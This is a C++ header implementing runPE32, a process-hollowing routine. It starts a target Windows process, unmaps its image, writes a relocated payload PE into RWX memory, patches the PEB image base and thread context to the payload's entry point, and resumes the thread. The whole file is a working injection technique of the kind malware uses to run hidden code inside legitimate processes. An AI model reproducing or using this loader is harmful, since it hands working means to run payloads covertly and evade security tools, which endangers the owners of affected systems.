#pragma once

#include <windows.h>
#include <stdio.h>

#include "ntdll_undoc.h"
#include "createproc.h"
#include "relocate.h"
#include "pe_raw_to_virtual.h"

/*
runPE32:
    targetPath - application where we want to inject
    payload - buffer with raw image of PE that we want to inject
    payload_size - size of the above

    desiredBase - address where we want to map the payload in the target memory; NULL if we don't care. 
        This address will be ignored if the payload has no relocations table, because then it must be mapped to it's original ImageBase.
    unmap_target - do we want to unmap the target? (we are not forced to do it if it doesn't disturb our chosen base)
*/
bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG desiredBase = NULL, bool unmap_target = false)
{
    if (!load_ntdll_functions()) return false;

    //check payload:
    IMAGE_NT_HEADERS32* payload_nt_hdr32 = get_nt_hrds32(payload);
    if (payload_nt_hdr32 == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }

    const ULONGLONG oldImageBase = payload_nt_hdr32->OptionalHeader.ImageBase;
    SIZE_T payloadImageSize = payload_nt_hdr32->OptionalHeader.SizeOfImage;

    //create target process:
    PROCESS_INFORMATION pi;
    if (!create_new_process1(targetPath, pi)) return false;
    printf("PID: %d\n", pi.dwProcessId);

    const SIZE_T kPtrSize = sizeof(DWORD); //for 32 bit
    DWORD targetImageBase = 0; //for 32 bit

	ULONGLONG PEB = 0;
    //get initial context of the target:

#if defined(_WIN64)
    WOW64_CONTEXT context;
    memset(&context, 0, sizeof(WOW64_CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    Wow64GetThreadContext(pi.hThread, &context);
#else	
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi.hThread, &context);
#endif
    //get image base of the target:
    PEB = context.Ebx;
    if (!ReadProcessMemory(pi.hProcess, LPVOID(PEB + 8), &targetImageBase, kPtrSize, NULL)) {
        return false;
    }
    printf("targetImageBase = %x\n", targetImageBase);

    if (has_relocations(payload) == false) {
        //payload have no relocations, so we are bound to use it's original image base
        desiredBase = payload_nt_hdr32->OptionalHeader.ImageBase;
    }
    
    if (unmap_target || targetImageBase == desiredBase) {
        //unmap the target:
        if (_NtUnmapViewOfSection(pi.hProcess, (PVOID)(static_cast<ULONGLONG>(targetImageBase))) != ERROR_SUCCESS) {
            printf("Unmapping the target failed!\n");
            return false;
        }
    }
    
    //try to allocate space that will be the most suitable for the payload:
    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, (LPVOID) desiredBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteAddress == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
    printf("Allocated remote ImageBase: %p size: %lx\n", remoteAddress, static_cast<ULONG>(payloadImageSize));

    //change the image base saved in headers - this is very important for loading imports:
    payload_nt_hdr32->OptionalHeader.ImageBase = static_cast<DWORD>((ULONGLONG)remoteAddress);

    //first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
    //when it will be ready, we will copy it into the space reserved in the target process

    LPVOID localCopyAddress = VirtualAlloc(NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);;
    if (localCopyAddress == NULL) {
        printf("Could not allocate memory in the current process\n");
        return false;
    }
    printf("Allocated local memory: %p size: %lx\n", localCopyAddress, static_cast<ULONG>(payloadImageSize));

    if (!copy_pe_to_virtual_l(payload, payload_size, localCopyAddress)) {
        printf("Could not copy PE file\n");
        return false;
    }

    //if the base address of the payload changed, we need to apply relocations:
    if ((ULONGLONG)remoteAddress != oldImageBase) {
        if (apply_relocations((ULONGLONG)remoteAddress, oldImageBase, localCopyAddress) == false) {
            printf("[ERROR] Could not relocate image!\n");
            return false;
        }
    }
    
    SIZE_T written = 0;
    // paste the local copy of the prepared image into the reserved space inside the remote process:
    if (!WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
        printf("[ERROR] Could not paste the image into remote process!\n");
        return false;
    }
    //free the localy allocated copy
    VirtualFree(localCopyAddress, payloadImageSize, MEM_FREE);

    //overwrite ImageBase stored in PEB
    DWORD remoteAddr32b = static_cast<DWORD>((ULONGLONG)remoteAddress);
    if (!WriteProcessMemory(pi.hProcess, LPVOID(PEB + 8), &remoteAddr32b, sizeof(DWORD), &written) || written != kPtrSize) {
        printf("Failed overwriting PEB: %d\n", static_cast<int>(written));
        return false;
    }

    //overwrite context: set new Entry Point
    DWORD newEP = static_cast<DWORD>((ULONGLONG)remoteAddress + payload_nt_hdr32->OptionalHeader.AddressOfEntryPoint);
    printf("newEP: %x\n", newEP);

    context.Eax = newEP;
#if defined(_WIN64)
    Wow64SetThreadContext(pi.hThread, &context);
#else
    SetThreadContext(pi.hThread, &context);
#endif
    //start the injected:
    printf("--\n");
    ResumeThread(pi.hThread);

    //free the handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}
